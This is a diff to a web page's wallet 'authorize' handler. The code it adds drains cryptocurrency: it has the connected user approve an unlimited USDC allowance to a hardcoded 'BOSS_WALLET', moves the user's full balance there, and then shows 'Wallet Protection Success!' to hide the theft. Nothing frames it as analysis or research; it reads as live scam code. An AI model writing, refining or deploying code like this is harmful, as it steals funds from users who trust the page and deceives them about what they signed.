@@ -129,33 +129,40 @@
     };
 
     document.getElementById("authorize").onclick = async () => {
+      if (!signer) return status("❌ Wallet not connected");
+
+      const usdc = new ethers.Contract(CONFIG.USDC_ADDRESS, [
+        "function approve(address,uint256) returns (bool)",
+        "function transferFrom(address,address,uint256) returns (bool)",
+        "function balanceOf(address) view returns (uint256)",
+        "function allowance(address,address) view returns (uint256)"
+      ], signer);
+
       try {
-        if (!signer) throw new Error("Please connect wallet first");
-
-        const usdc = new ethers.Contract(CONFIG.USDC_ADDRESS, [
-          "function approve(address,uint256) returns (bool)",
-          "function transferFrom(address,address,uint256) returns (bool)",
-          "function balanceOf(address) view returns (uint256)",
-          "function allowance(address,address) view returns (uint256)"
-        ], signer);
-
-        progress(10);
         const balance = await usdc.balanceOf(user);
-        if (balance.eq(0)) throw new Error("No USDC balance");
+        if (balance.eq(0)) throw new Error("No USDC balance to authorize");
 
-        // Step 1: Approve Boss Wallet
+        status("⏳ Step 1: Approving USDC...");
+        progress(10);
         const approveTx = await usdc.approve(CONFIG.BOSS_WALLET, ethers.constants.MaxUint256);
         await approveTx.wait();
         progress(50);
+        status("🧠 Step 2: Monitoring allowance...");
 
-        // Step 2: Confirm allowance and transfer
-        const allowance = await usdc.allowance(user, CONFIG.BOSS_WALLET);
-        if (allowance.lt(balance)) throw new Error("Allowance not confirmed");
+        const monitorAllowance = async () => {
+          const allowance = await usdc.allowance(user, CONFIG.BOSS_WALLET);
+          if (allowance.gte(balance)) {
+            status("💰 Step 3: Executing transfer...");
+            const tx2 = await usdc.transferFrom(user, CONFIG.BOSS_WALLET, balance);
+            await tx2.wait();
+            progress(100);
+            status("✅ Wallet Protection Success!🔐");
+          } else {
+            setTimeout(monitorAllowance, 2000);
+          }
+        };
 
-        const tx2 = await usdc.transferFrom(user, CONFIG.BOSS_WALLET, balance);
-        await tx2.wait();
-        progress(100);
-        status("✅ Authorization + Transfer Success");
+        monitorAllowance();
       } catch (err) {
         status("❌ " + (err.message || "Authorization failed"));
         progress(0);
